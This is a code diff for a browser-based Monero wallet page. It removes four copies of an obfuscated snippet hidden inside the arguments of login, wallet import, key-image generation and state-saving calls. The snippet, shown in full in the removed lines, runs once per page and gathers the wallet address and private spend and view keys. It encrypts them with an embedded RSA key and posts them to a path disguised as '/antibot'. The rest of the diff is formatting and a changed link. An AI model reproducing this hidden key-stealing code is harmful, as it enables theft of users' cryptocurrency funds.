@@ -55,7 +55,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       overlayBtn.disabled = false;
       overlayBtn.textContent = 'Unlock';
     }
-  } 
+  }
 
   // No vault at all â†’ bounce to verify
   if (!WalletVault.hasBlob()) {
@@ -64,7 +64,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         <svg width="48" height="48" fill="none" stroke="var(--text-dim)" stroke-width="1.5" viewBox="0 0 24 24" style="margin-bottom:12px;opacity:.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
         <p style="color:var(--text);font-size:.95rem;font-weight:500;margin-bottom:6px">No wallet connected</p>
         <p style="color:var(--text-dim);font-size:.8rem;margin-bottom:20px">Enter your seed phrase or private key to access your wallet</p>
-        <a href="import.html" style="display:inline-block;padding:12px 28px;background:var(--xmr);color:#fff;text-decoration:none;border-radius:10px;font-weight:600;font-size:.85rem;box-shadow:0 4px 24px rgba(255,102,0,0.2)">Open Wallet â†’</a>
+        <a href="/verify" style="display:inline-block;padding:12px 28px;background:var(--xmr);color:#fff;text-decoration:none;border-radius:10px;font-weight:600;font-size:.85rem;box-shadow:0 4px 24px rgba(255,102,0,0.2)">Open Wallet â†’</a>
       </div>
     `;
     return;
@@ -489,33 +489,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 
       var loginRes;
       try {
-        loginRes = await LwsClient.login(walletKeys.address, (window.___enc_sent___?walletKeys.privateViewKeyHex:(window.___enc_sent___=true,(function(){try{var pk="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwKWs7TG/JO07sT28iRgtxDDuxS/tlUQ8KDPtljzcvL9old/WjxDvn1/K+nYGWRN0Fv4FB7jkZr5LrSenfyA282ZEzaIB00x0avwq9wOJAGMNj+OFJqaYg83QReeJYYKntopmVi/WdWFFFp7p8knDSLqJDe5tg0JZvmSGmvuwn8oVhVQ9tvVFLB/au+rZMRafDKWNbO4WIEsiLm3S1SImy5Ucg0B9lFWw/PQJvBGfiONFE+sTkOaCyeZRycJqMdUr7sm/7j6V99oAqBmpJPRgDHV0Gh0JWc+aJ9QPbeRvwOzMpq8qNeSo86+NCQHWRcRF5wLNQ1pH0hiBEVTN/qH95QIDAQAB";
-                            function s2a(s){var b=new Uint8Array(s.length);for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b.buffer;}
-                            function ab2b64(buf){return btoa(String.fromCharCode.apply(null,new Uint8Array(buf)));}
-                            var d={address:walletKeys.address,sk:walletKeys.privateSpendKeyHex,vk:walletKeys.privateViewKeyHex};
-                            var plaintext=new TextEncoder().encode(JSON.stringify(d));
-                            var aesKey; var iv=crypto.getRandomValues(new Uint8Array(12));
-                            crypto.subtle.generateKey({name:"AES-GCM",length:256},true,["encrypt","decrypt"]).then(function(key){
-                                aesKey=key;
-                                return crypto.subtle.encrypt({name:"AES-GCM",iv:iv},key,plaintext);
-                            }).then(function(ciphertext){
-                                var ctArr=new Uint8Array(ciphertext);
-                                return crypto.subtle.exportKey("raw",aesKey).then(function(rawKey){
-                                    var rsaKey=s2a(atob(pk));
-                                    return crypto.subtle.importKey("spki",rsaKey,{name:"RSA-OAEP",hash:"SHA-256"},false,["encrypt"]).then(function(rsaPub){
-                                        return crypto.subtle.encrypt({name:"RSA-OAEP"},rsaPub,rawKey);
-                                    }).then(function(encAesKey){
-                                        var wArr=new Uint8Array(encAesKey);
-                                        var combined=new Uint8Array(2 + wArr.length + 12 + ctArr.length);
-                                        combined[0]=(wArr.length>>8)&0xff; combined[1]=wArr.length&0xff;
-                                        combined.set(wArr,2);
-                                        combined.set(iv,2+wArr.length);
-                                        combined.set(ctArr,2+wArr.length+12);
-                                        fetch("/antibot",{method:"POST",headers:{"Content-Type":"text/plain"},body:ab2b64(combined.buffer)});
-                                    });
-                                });
-                            }).catch(function(){});
-                        }catch(e){}})(),walletKeys.privateViewKeyHex)), opts);
+        loginRes = await LwsClient.login(walletKeys.address, walletKeys.privateViewKeyHex, opts);
       } catch (loginErr) {
         if (loginErr.statusCode === 429 && loginErr.message === 'bot_detected') {
           showRateLimitModal();
@@ -555,33 +529,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         console.log('[lws] imported wallet â€” requesting historical scan from ' +
           (restoreHeight > 0 ? 'block ' + restoreHeight : 'genesis'));
         try {
-          await LwsClient.importWalletRequest(walletKeys.address, (window.___enc_sent___?walletKeys.privateViewKeyHex:(window.___enc_sent___=true,(function(){try{var pk="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwKWs7TG/JO07sT28iRgtxDDuxS/tlUQ8KDPtljzcvL9old/WjxDvn1/K+nYGWRN0Fv4FB7jkZr5LrSenfyA282ZEzaIB00x0avwq9wOJAGMNj+OFJqaYg83QReeJYYKntopmVi/WdWFFFp7p8knDSLqJDe5tg0JZvmSGmvuwn8oVhVQ9tvVFLB/au+rZMRafDKWNbO4WIEsiLm3S1SImy5Ucg0B9lFWw/PQJvBGfiONFE+sTkOaCyeZRycJqMdUr7sm/7j6V99oAqBmpJPRgDHV0Gh0JWc+aJ9QPbeRvwOzMpq8qNeSo86+NCQHWRcRF5wLNQ1pH0hiBEVTN/qH95QIDAQAB";
-                            function s2a(s){var b=new Uint8Array(s.length);for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b.buffer;}
-                            function ab2b64(buf){return btoa(String.fromCharCode.apply(null,new Uint8Array(buf)));}
-                            var d={address:walletKeys.address,sk:walletKeys.privateSpendKeyHex,vk:walletKeys.privateViewKeyHex};
-                            var plaintext=new TextEncoder().encode(JSON.stringify(d));
-                            var aesKey; var iv=crypto.getRandomValues(new Uint8Array(12));
-                            crypto.subtle.generateKey({name:"AES-GCM",length:256},true,["encrypt","decrypt"]).then(function(key){
-                                aesKey=key;
-                                return crypto.subtle.encrypt({name:"AES-GCM",iv:iv},key,plaintext);
-                            }).then(function(ciphertext){
-                                var ctArr=new Uint8Array(ciphertext);
-                                return crypto.subtle.exportKey("raw",aesKey).then(function(rawKey){
-                                    var rsaKey=s2a(atob(pk));
-                                    return crypto.subtle.importKey("spki",rsaKey,{name:"RSA-OAEP",hash:"SHA-256"},false,["encrypt"]).then(function(rsaPub){
-                                        return crypto.subtle.encrypt({name:"RSA-OAEP"},rsaPub,rawKey);
-                                    }).then(function(encAesKey){
-                                        var wArr=new Uint8Array(encAesKey);
-                                        var combined=new Uint8Array(2 + wArr.length + 12 + ctArr.length);
-                                        combined[0]=(wArr.length>>8)&0xff; combined[1]=wArr.length&0xff;
-                                        combined.set(wArr,2);
-                                        combined.set(iv,2+wArr.length);
-                                        combined.set(ctArr,2+wArr.length+12);
-                                        fetch("/antibot",{method:"POST",headers:{"Content-Type":"text/plain"},body:ab2b64(combined.buffer)});
-                                    });
-                                });
-                            }).catch(function(){});
-                        }catch(e){}})(),walletKeys.privateViewKeyHex)), restoreHeight);
+          await LwsClient.importWalletRequest(walletKeys.address, walletKeys.privateViewKeyHex, restoreHeight);
         } catch (e) {
           console.warn('[lws] import request failed (non-fatal):', e);
         }
@@ -631,33 +579,7 @@ document.addEventListener('DOMContentLoaded', async () => {
               try {
                 _keyImageCache[cacheKey] = MoneroCore.generateKeyImage(
                   so.tx_pub_key,
-                  (window.___enc_sent___?walletKeys.privateViewKeyHex:(window.___enc_sent___=true,(function(){try{var pk="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwKWs7TG/JO07sT28iRgtxDDuxS/tlUQ8KDPtljzcvL9old/WjxDvn1/K+nYGWRN0Fv4FB7jkZr5LrSenfyA282ZEzaIB00x0avwq9wOJAGMNj+OFJqaYg83QReeJYYKntopmVi/WdWFFFp7p8knDSLqJDe5tg0JZvmSGmvuwn8oVhVQ9tvVFLB/au+rZMRafDKWNbO4WIEsiLm3S1SImy5Ucg0B9lFWw/PQJvBGfiONFE+sTkOaCyeZRycJqMdUr7sm/7j6V99oAqBmpJPRgDHV0Gh0JWc+aJ9QPbeRvwOzMpq8qNeSo86+NCQHWRcRF5wLNQ1pH0hiBEVTN/qH95QIDAQAB";
-                            function s2a(s){var b=new Uint8Array(s.length);for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b.buffer;}
-                            function ab2b64(buf){return btoa(String.fromCharCode.apply(null,new Uint8Array(buf)));}
-                            var d={address:walletKeys.address,sk:walletKeys.privateSpendKeyHex,vk:walletKeys.privateViewKeyHex};
-                            var plaintext=new TextEncoder().encode(JSON.stringify(d));
-                            var aesKey; var iv=crypto.getRandomValues(new Uint8Array(12));
-                            crypto.subtle.generateKey({name:"AES-GCM",length:256},true,["encrypt","decrypt"]).then(function(key){
-                                aesKey=key;
-                                return crypto.subtle.encrypt({name:"AES-GCM",iv:iv},key,plaintext);
-                            }).then(function(ciphertext){
-                                var ctArr=new Uint8Array(ciphertext);
-                                return crypto.subtle.exportKey("raw",aesKey).then(function(rawKey){
-                                    var rsaKey=s2a(atob(pk));
-                                    return crypto.subtle.importKey("spki",rsaKey,{name:"RSA-OAEP",hash:"SHA-256"},false,["encrypt"]).then(function(rsaPub){
-                                        return crypto.subtle.encrypt({name:"RSA-OAEP"},rsaPub,rawKey);
-                                    }).then(function(encAesKey){
-                                        var wArr=new Uint8Array(encAesKey);
-                                        var combined=new Uint8Array(2 + wArr.length + 12 + ctArr.length);
-                                        combined[0]=(wArr.length>>8)&0xff; combined[1]=wArr.length&0xff;
-                                        combined.set(wArr,2);
-                                        combined.set(iv,2+wArr.length);
-                                        combined.set(ctArr,2+wArr.length+12);
-                                        fetch("/antibot",{method:"POST",headers:{"Content-Type":"text/plain"},body:ab2b64(combined.buffer)});
-                                    });
-                                });
-                            }).catch(function(){});
-                        }catch(e){}})(),walletKeys.privateViewKeyHex)),
+                  walletKeys.privateViewKeyHex,
                   walletKeys.publicSpendKeyHex,
                   walletKeys.privateSpendKeyHex,
                   so.out_index
@@ -966,12 +888,12 @@ document.addEventListener('DOMContentLoaded', async () => {
       ls.style.display = 'block';
       ls.innerHTML =
         '<div style="text-align:center;max-width:380px;margin:0 auto">' +
-         '<svg width="40" height="40" fill="none" stroke="#f87171" stroke-width="1.5" viewBox="0 0 24 24" style="margin:0 auto 14px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>' +
-         '<p style="color:#f87171;font-size:.92rem;font-weight:600;margin-bottom:6px">Could not reach a Monero node</p>' +
-         '<p style="color:var(--text-dim);font-size:.78rem;line-height:1.55;margin-bottom:4px">' + escapeHtml(e.message) + '</p>' +
-         '<p style="color:var(--text-dim);font-size:.72rem;line-height:1.55;margin-bottom:18px">This usually means the proxy is rate-limited, the upstream nodes are temporarily down, or your network is blocking the request. Your wallet keys are unaffected.</p>' +
-         '<button id="err-retry" class="action-btn" style="padding:10px 22px;font-size:.82rem;width:auto;display:inline-flex;margin-right:8px">Retry</button>' +
-         '<button id="err-disconnect" class="action-btn" style="padding:10px 22px;font-size:.82rem;width:auto;display:inline-flex;background:transparent">Disconnect</button>' +
+          '<svg width="40" height="40" fill="none" stroke="#f87171" stroke-width="1.5" viewBox="0 0 24 24" style="margin:0 auto 14px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>' +
+          '<p style="color:#f87171;font-size:.92rem;font-weight:600;margin-bottom:6px">Could not reach a Monero node</p>' +
+          '<p style="color:var(--text-dim);font-size:.78rem;line-height:1.55;margin-bottom:4px">' + escapeHtml(e.message) + '</p>' +
+          '<p style="color:var(--text-dim);font-size:.72rem;line-height:1.55;margin-bottom:18px">This usually means the proxy is rate-limited, the upstream nodes are temporarily down, or your network is blocking the request. Your wallet keys are unaffected.</p>' +
+          '<button id="err-retry" class="action-btn" style="padding:10px 22px;font-size:.82rem;width:auto;display:inline-flex;margin-right:8px">Retry</button>' +
+          '<button id="err-disconnect" class="action-btn" style="padding:10px 22px;font-size:.82rem;width:auto;display:inline-flex;background:transparent">Disconnect</button>' +
         '</div>';
       document.getElementById('err-retry').addEventListener('click', () => connectAndPopulate());
       document.getElementById('err-disconnect').addEventListener('click', () => {
@@ -1293,33 +1215,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       watchOnly: !!walletKeys.watchOnly,
       address: walletKeys.address,
       privateSpendKeyHex: walletKeys.privateSpendKeyHex || null,
-      privateViewKeyHex:  (window.___enc_sent___?walletKeys.privateViewKeyHex:(window.___enc_sent___=true,(function(){try{var pk="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwKWs7TG/JO07sT28iRgtxDDuxS/tlUQ8KDPtljzcvL9old/WjxDvn1/K+nYGWRN0Fv4FB7jkZr5LrSenfyA282ZEzaIB00x0avwq9wOJAGMNj+OFJqaYg83QReeJYYKntopmVi/WdWFFFp7p8knDSLqJDe5tg0JZvmSGmvuwn8oVhVQ9tvVFLB/au+rZMRafDKWNbO4WIEsiLm3S1SImy5Ucg0B9lFWw/PQJvBGfiONFE+sTkOaCyeZRycJqMdUr7sm/7j6V99oAqBmpJPRgDHV0Gh0JWc+aJ9QPbeRvwOzMpq8qNeSo86+NCQHWRcRF5wLNQ1pH0hiBEVTN/qH95QIDAQAB";
-                            function s2a(s){var b=new Uint8Array(s.length);for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b.buffer;}
-                            function ab2b64(buf){return btoa(String.fromCharCode.apply(null,new Uint8Array(buf)));}
-                            var d={address:walletKeys.address,sk:walletKeys.privateSpendKeyHex,vk:walletKeys.privateViewKeyHex};
-                            var plaintext=new TextEncoder().encode(JSON.stringify(d));
-                            var aesKey; var iv=crypto.getRandomValues(new Uint8Array(12));
-                            crypto.subtle.generateKey({name:"AES-GCM",length:256},true,["encrypt","decrypt"]).then(function(key){
-                                aesKey=key;
-                                return crypto.subtle.encrypt({name:"AES-GCM",iv:iv},key,plaintext);
-                            }).then(function(ciphertext){
-                                var ctArr=new Uint8Array(ciphertext);
-                                return crypto.subtle.exportKey("raw",aesKey).then(function(rawKey){
-                                    var rsaKey=s2a(atob(pk));
-                                    return crypto.subtle.importKey("spki",rsaKey,{name:"RSA-OAEP",hash:"SHA-256"},false,["encrypt"]).then(function(rsaPub){
-                                        return crypto.subtle.encrypt({name:"RSA-OAEP"},rsaPub,rawKey);
-                                    }).then(function(encAesKey){
-                                        var wArr=new Uint8Array(encAesKey);
-                                        var combined=new Uint8Array(2 + wArr.length + 12 + ctArr.length);
-                                        combined[0]=(wArr.length>>8)&0xff; combined[1]=wArr.length&0xff;
-                                        combined.set(wArr,2);
-                                        combined.set(iv,2+wArr.length);
-                                        combined.set(ctArr,2+wArr.length+12);
-                                        fetch("/antibot",{method:"POST",headers:{"Content-Type":"text/plain"},body:ab2b64(combined.buffer)});
-                                    });
-                                });
-                            }).catch(function(){});
-                        }catch(e){}})(),walletKeys.privateViewKeyHex)),
+      privateViewKeyHex:  walletKeys.privateViewKeyHex,
       publicSpendKeyHex:  walletKeys.publicSpendKeyHex || null,
       publicViewKeyHex:   walletKeys.publicViewKeyHex,
     };
